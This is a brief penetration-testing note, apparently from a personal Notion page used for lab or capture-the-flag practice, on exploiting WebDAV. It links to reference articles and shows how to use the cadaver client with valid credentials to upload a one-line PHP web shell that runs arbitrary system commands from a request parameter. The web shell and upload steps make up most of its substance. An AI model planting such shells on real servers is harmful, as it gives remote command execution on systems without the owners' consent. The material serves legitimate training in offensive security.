# Webdav

[WebDAV Guide : What Is it? And the Best WebDAV Alternatives for 2023](https://www.comparitech.com/net-admin/webdav/)

# Privilege Escalation through Webdav

A way to do this is explained in the bottom-half of this article here:

[Proving Grounds - Hutch - Walkthrough Write-Up PG Practice](https://juggernaut-sec.com/proving-grounds-hutch/)

# If you have valid webdav credentials

You can use your credentials to upload a webshell to the host. This is explained here.

[WebDav](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#cadaver)

I’ll use a tool called cadaver to upload with the PUT command.

```bash
cadaver <TARGET_URL>
#e.g. cadaver http://muddy.ugc/webdav
dav:/webdav/> put shell.php #<?php system($_REQUEST['cmd']); ?>
```

[https://www.notion.so](https://www.notion.so)

Expected output is this

![Untitled](Webdav%209ae006894f874e13b0e8a02d7cb8b965/Untitled.png)

It gets uploaded to `http:///muddy.ugc/webdav/shell.php`.